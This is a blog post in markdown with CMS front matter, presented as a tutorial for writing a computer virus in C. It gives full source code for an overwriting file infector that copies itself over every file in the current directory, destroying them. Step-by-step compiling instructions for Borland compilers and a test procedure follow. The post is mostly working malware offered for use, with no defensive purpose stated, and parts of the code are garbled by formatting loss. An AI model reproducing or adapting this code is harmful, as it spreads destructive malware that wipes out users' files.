---
# http://learn.getgrav.org/content/headers
title: Creating a virus : Tutorial
slug: creating-a-virus-tutorial
# menu: Creating a virus : Tutorial
date: 06-02-2011
published: true
publish_date: 06-02-2011
# unpublish_date: 06-02-2011
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - hacking
        - internet
        - tutorial
        - virus
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [hacking,internet,tutorial,virus]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

This program is an example of how to create a virus in C. This program demonstrates a simple virus program which upon execution (Running) creates a copy of itself in the other file. Thus it destroys other files by infecting them. But the virus infected file is also capable of spreading the infection to another file and so on. Here’s the source code of the virus program.  
 

\#include  
\#include  
\#include  
\#include  
\#include  
\#include FILE \*virus,\*host;  
int done,a=0;  
unsigned long x;  
char buff[2048];  
struct ffblk ffblk;  
clock\_t st,end;  
void main()  
{  
st=clock();  
clrscr();  
done=findfirst(“\*.\*”,&ffblk,0);  
while(!done)  
{  
virus=fopen(\_argv[0],”rb”);  
host=fopen(ffblk.ff\_name,”rb+”);  
if(host==NULL) goto next;  
x=89088;  
printf(“Infecting %sn”,ffblk.ff\_name,a);  
while(x>2048)  
{  
fread(buff,2048,1,virus);  
fwrite(buff,2048,1,host);  
x-=2048;  
}  
fread(buff,x,1,virus);  
fwrite(buff,x,1,host);  
a++;  
next:  
{  
fcloseall();  
done=findnext(&ffblk);  
}  
}  
printf(“DONE! (Total Files Infected= %d)”,a);  
end=clock();  
printf(“TIME TAKEN=%f SECn”,  
(end-st)/CLK\_TCK);  
getch();  
}

 

### COMPILING METHOD:

 

**USING BORLAND TC++ 3.0 (16-BIT):**  
1. Load the program in the compiler, press Alt-F9 to compile  
2. Press F9 to generate the EXE file (DO NOT PRESS CTRL-F9,THIS WILL INFECT ALL THE FILES IN CUR DIRECTORY INCLUDIN YOUR COMPILER)  
3. Note down the size of generated EXE file in bytes (SEE EXE FILE PROPERTIES FOR IT’S SIZE)  
4. Change the value of X in the source code with the noted down size (IN THE ABOVE SOURCE CODE x= 89088; CHANGE IT)  
5. Once again follow the STEP 1 & STEP 2.Now the generated EXE File is ready to infect

 

**USING BORLAND C++ 5.5 (32-BIT) :**  
1. Compile once,note down the generated EXE file length in bytes  
2. Change the value of X in source code to this length in bytes  
3. Recompile it.The new EXE file is ready to infect

 

### HOW TO TEST:

 

1. Open new empty folder  
2. Put some EXE files (BY SEARCHING FOR \*.EXE IN SEARCH & PASTING IN THE NEW FOLDER)  
3. Run the virus EXE file there you will see all the files in the current directory get infected.  
4. All the infected files will be ready to reinfect  
That’s it



Go to our new site- shankee.com
